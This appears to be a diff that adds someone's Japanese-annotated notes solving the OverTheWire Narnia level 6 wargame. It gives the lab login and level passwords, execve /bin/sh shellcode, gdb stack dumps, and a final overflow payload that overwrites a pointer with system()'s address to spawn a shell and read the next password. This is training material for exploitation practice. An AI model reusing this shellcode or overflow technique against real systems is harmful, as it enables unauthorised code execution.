@@ -1,0 +1,195 @@
+```sh
+$ ssh -p 2226 narnia6@narnia.labs.overthewire.org
+```
+
+password: neezocaeng
+
+
+
+```
+++++++++++ high(0xffffffff)
+.........
+++++++++++
+   esp
+++++++++++
+  argv[1]  <- ebp + 0x10
+++++++++++
+  argv[0]  <- ebp + 0xc
+++++++++++
+   argc    <- ebp + 0x8
+++++++++++
+return addr <- ebp + 0x4
+++++++++++
+   ebp
+++++++++++
+.........
+++++++++++ low(0x00000000)
+```
+
+
+```
+$ ./narnia6 $(python -c 'print "A" * 7') $(python -c 'print "B" * 16') <- B は16以上渡すとSEGV
+```
+
+```
+$ ./narnia6 $(python -c 'print "A" * 8') $(python -c 'print "B" * 15') <- A は8以上渡すとSEGV
+```
+
+
+```
+$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
+```
+
+シェルコード流し込むには足りない？
+
+```
+$(python -c 'print "A" * 8 + "\xef\xbe\xad\xde" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
+```
+
+```
+gdb-peda$ r $(echo -e "AAAAAAAAAAAAAAAA") BBBB
+Starting program: /bin/dash $(echo -e "AAAAAAAAAAAAAAAA") BBBB
+/bin/dash: 0: Can't open AAAAAAAAAAAAAAAA
+[Inferior 2 (process 20269) exited with code 0177]
+Warning: not running or target is remote
+gdb-peda$ r AAAAAAAAAAAAAAAA BBBB
+```
+
+1回終了すると上手く行く
+
+```
+~/ctf/OverTheWire/Narnia/level6:yyy@[master](*｡˃̵ω ˂̵｡) < gdb narnia6                                                                                                                        [master]
+Reading symbols from narnia6...(no debugging symbols found)...done.
+gdb-peda$ r AAAAAAAAAAAAAAAA BBBB
+Starting program: /home/yyy/ctf/OverTheWire/Narnia/level6/narnia6 AAAAAAAAAAAAAAAA BBBB
+```
+
+
+```
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e33da0 <system>
+```
+
+0xf7e33da0
+
+\xa0\x3d\xe3\xf7
+
+
+r $(echo -e "AAAAAAAA\xa0\x3d\xe3\xf7") BBBB
+
+```
+r $(echo -e "AAAAAAAAAAAAAAAA") BBBB
+
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$ x/100wx $esp
+0xffffbeec: 0x080486b4  0xffffbf10  0xffffc296  0x0000000b
+0xffffbefc: 0x08048712  0x00000003  0xffffbfc4  0x42424242
+0xffffbf0c: 0xf7e27c00  0x41414141  0x41414141  0x41414141
+0xffffbf1c: 0x41414141  0xf7fab000  0x00000000  0x00000000
+0xffffbf2c: 0xf7e11637  0x00000003  0xffffbfc4  0xffffbfd4
+0xffffbf3c: 0x00000000  0x00000000  0x00000000  0xf7fab000
+0xffffbf4c: 0xf7ffdc04  0xf7ffd000  0x00000000  0xf7fab000
+0xffffbf5c: 0xf7fab000  0x00000000  0x926f3754  0xaf3ab944
+0xffffbf6c: 0x00000000  0x00000000  0x00000000  0x00000003
+0xffffbf7c: 0x08048450  0x00000000  0xf7fee030  0xf7fe88a0
+0xffffbf8c: 0xf7ffd000  0x00000003  0x08048450  0x00000000
+0xffffbf9c: 0x08048471  0x08048559  0x00000003  0xffffbfc4
+0xffffbfac: 0x080486c0  0x08048730  0xf7fe88a0  0xffffbfbc
+0xffffbfbc: 0xf7ffd918  0x00000003  0xffffc255  0xffffc285
+0xffffbfcc: 0xffffc296  0x00000000  0xffffc29b  0xffffc2d7
+0xffffbfdc: 0xffffc2e9  0xffffc2f8  0xffffc303  0xffffc316
+0xffffbfec: 0xffffc330  0xffffc347  0xffffc373  0xffffc3a6
+0xffffbffc: 0xffffc3c7  0xffffc3d3  0xffffc3dd  0xffffc402
+0xffffc00c: 0xffffc415  0xffffc4d7  0xffffc4e9  0xffffc4fd
+0xffffc01c: 0xffffc513  0xffffc528  0xffffc537  0xffffc55e
+0xffffc02c: 0xffffc587  0xffffc5a8  0xffffc5c3  0xffffc5d5
+0xffffc03c: 0xffffc5f5  0xffffc608  0xffffc642  0xffffc686
+0xffffc04c: 0xffffc6bc  0xffffc700  0xffffc717  0xffffc73a
+0xffffc05c: 0xffffc759  0xffffc76d  0xffffc79a  0xffffc7a3
+0xffffc06c: 0xffffc7cf  0xffffc7f8  0xffffc809  0xffffc81b
+```
+
+
+```
+r $(echo -e "AAAAAAAAAAAAAAAA") BBBBBBBBBBBB
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$ x/100wx $esp
+0xffffbedc: 0x080486b4  0xffffbf00  0xffffc28e  0x0000000b
+0xffffbeec: 0x08048712  0x00000003  0xffffbfb4  0x42424242
+0xffffbefc: 0x42424242  0x42424242  0x41414100  0x41414141
+0xffffbf0c: 0x41414141  0xf7fab000  0x00000000  0x00000000
+0xffffbf1c: 0xf7e11637  0x00000003  0xffffbfb4  0xffffbfc4
+0xffffbf2c: 0x00000000  0x00000000  0x00000000  0xf7fab000
+0xffffbf3c: 0xf7ffdc04  0xf7ffd000  0x00000000  0xf7fab000
+0xffffbf4c: 0xf7fab000  0x00000000  0x138dfcbe  0x2ed852ae
+0xffffbf5c: 0x00000000  0x00000000  0x00000000  0x00000003
+0xffffbf6c: 0x08048450  0x00000000  0xf7fee030  0xf7fe88a0
+0xffffbf7c: 0xf7ffd000  0x00000003  0x08048450  0x00000000
+0xffffbf8c: 0x08048471  0x08048559  0x00000003  0xffffbfb4
+0xffffbf9c: 0x080486c0  0x08048730  0xf7fe88a0  0xffffbfac
+0xffffbfac: 0xf7ffd918  0x00000003  0xffffc24d  0xffffc27d
+0xffffbfbc: 0xffffc28e  0x00000000  0xffffc29b  0xffffc2d7
+0xffffbfcc: 0xffffc2e9  0xffffc2f8  0xffffc303  0xffffc316
+0xffffbfdc: 0xffffc330  0xffffc347  0xffffc373  0xffffc3a6
+0xffffbfec: 0xffffc3c7  0xffffc3d3  0xffffc3dd  0xffffc402
+0xffffbffc: 0xffffc415  0xffffc4d7  0xffffc4e9  0xffffc4fd
+0xffffc00c: 0xffffc513  0xffffc528  0xffffc537  0xffffc55e
+0xffffc01c: 0xffffc587  0xffffc5a8  0xffffc5c3  0xffffc5d5
+0xffffc02c: 0xffffc5f5  0xffffc608  0xffffc642  0xffffc686
+0xffffc03c: 0xffffc6bc  0xffffc700  0xffffc717  0xffffc73a
+0xffffc04c: 0xffffc759  0xffffc76d  0xffffc79a  0xffffc7a3
+0xffffc05c: 0xffffc7cf  0xffffc7f8  0xffffc809  0xffffc81b
+```
+
+
+r $(echo -e "AAAAAA\xa0\x3d\xe3\xf7") BBBB
+
+```
+Stopped reason: SIGSEGV
+0x0800f7e3 in ?? ()
+gdb-peda$ x/300wx $esp
+```
+
+```
+0xffffc24c: 0x2f667463  0x7265764f  0x57656854  0x2f657269
+0xffffc25c: 0x6e72614e  0x6c2f6169  0x6c657665  0x616e2f36
+0xffffc26c: 0x61696e72  0x41410036  0x41414141  0xe33da041
+0xffffc27c: 0x424200f7  0x00004242  0x00000000  0x00000000
+0xffffc28c: 0x00000000  0x00000000  0x00000000  0x00000000
+```
+
+r $(echo -e "AAAAAAA\xa0\x3d\xe3\xf7") BBBB
+
+```
+Stopped reason: SIGSEGV
+0x00f7e33d in ?? ()
+gdb-peda$ x/300wx $esp
+```
+
+```
+0xffffc24c: 0x2f667463  0x7265764f  0x57656854  0x2f657269
+0xffffc25c: 0x6e72614e  0x6c2f6169  0x6c657665  0x616e2f36
+0xffffc26c: 0x61696e72  0x41410036  0x41414141  0xe33da041
+0xffffc27c: 0x424200f7  0x00004242  0x00000000  0x00000000
+0xffffc28c: 0x00000000  0x00000000  0x00000000  0x00000000
+```
+
+r $(echo -e "AAAAAAAA\xa0\x3d\xe3\xf7") BBBB
+
+
+## In remote
+```
+Temporary breakpoint 1, 0x0804855d in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e62e70 <system>
+```
+
+$(echo -e "AAAAAAAA\x70\x2e\xe6\xf7") $(echo -e "BBBBBBBB/bin/sh")
+
+```sh
+narnia6@narnia:/etc/narnia_pass$ /narnia/narnia6 $(echo -e "AAAAAAAA\x70\x2e\xe6\xf7") $(echo -e "BBBBBBBB/bin/sh")
+$ cat narnia7
+ahkiaziphu
+```
